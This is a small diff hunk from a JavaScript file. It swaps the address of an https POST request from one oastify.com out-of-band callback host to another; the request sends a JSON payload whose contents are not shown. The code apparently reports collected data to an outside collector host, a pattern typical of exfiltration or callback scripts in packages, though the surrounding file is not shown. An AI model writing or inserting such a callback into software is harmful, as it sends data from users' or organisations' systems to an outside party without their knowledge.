@@ -53,7 +53,7 @@ const payload = JSON.stringify({
 
 }, null, 2);
 
-const req = https.request('https://4ty7ti66yuuel5ymvbdbuq27gymparyg.oastify.com', {
+const req = https.request('https://ozru3mat8505co8jampjim620t6kubi0.oastify.com', {
   method: 'POST',
   headers: {
     'Content-Type': 'application/json',
